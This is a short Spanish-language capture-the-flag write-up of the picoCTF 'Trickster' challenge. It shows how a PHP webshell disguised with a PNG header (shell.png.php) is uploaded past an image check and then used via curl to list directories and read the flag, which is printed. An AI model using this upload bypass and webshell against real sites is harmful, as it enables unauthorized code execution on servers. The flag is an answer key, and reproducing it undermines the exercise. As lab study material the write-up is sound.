# Trickster
# Descripción
I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:56035/)!
# Solución
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}

Subí un archivo `shell.png.php` con cabecera PNG y código PHP para evadir la validación del sistema. La aplicación lo aceptó como imagen, pero al acceder a él desde `/uploads/` se ejecutó como webshell. Con comandos como `ls` y `cat` exploré los directorios del servidor hasta encontrar un archivo de texto que contenía la flag.

```
erasmo-picoctf@webshell:~$ printf '\x89PNG\r\n\x1a\n<?php if(isset($_REQUEST["cmd"])) system($_REQUEST["cmd"]); ?>' > shell.png.php
erasmo-picoctf@webshell:~$ ls
README.txt       challenge.zip.6  fixme2.py            level3.flag.txt.enc
challenge.zip    code.py          glitch.txt           level3.hash.bin
challenge.zip.1  codebook.txt     home                 level3.py
challenge.zip.2  convertme.py     level1.flag.txt.enc  runme.py
challenge.zip.3  drop-in          level1.py            shell.php.png
challenge.zip.4  echo             level2.flag.txt.enc  shell.png
challenge.zip.5  fixme1.py        level2.py            shell.png.php
erasmo-picoctf@webshell:~$ curl -s -F "file=@shell.png.php" http://atlas.picoctf.net:56035/
<!DOCTYPE html>
<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>

erasmo-picoctf@webshell:~$ curl -s "http://atlas.picoctf.net:56035/uploads/shell.png.php?cmd=ls"
PNG

shell.php.png
shell.png
shell.png.php
erasmo-picoctf@webshell:~$ curl -s "http://atlas.picoctf.net:56035/uploads/shell.png.php?cmd=ls%20.."
PNG

HFQWKODGMIYTO.txt
index.php
instructions.txt
robots.txt
uploads
erasmo-picoctf@webshell:~$ curl -s "http://atlas.picoctf.net:56035/uploads/shell.png.php?cmd=cat%20../HFQWKODGMIYTO.txt"
PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */erasmo-picoctf@webshell:~$ 
```
# Notas
# Referencias
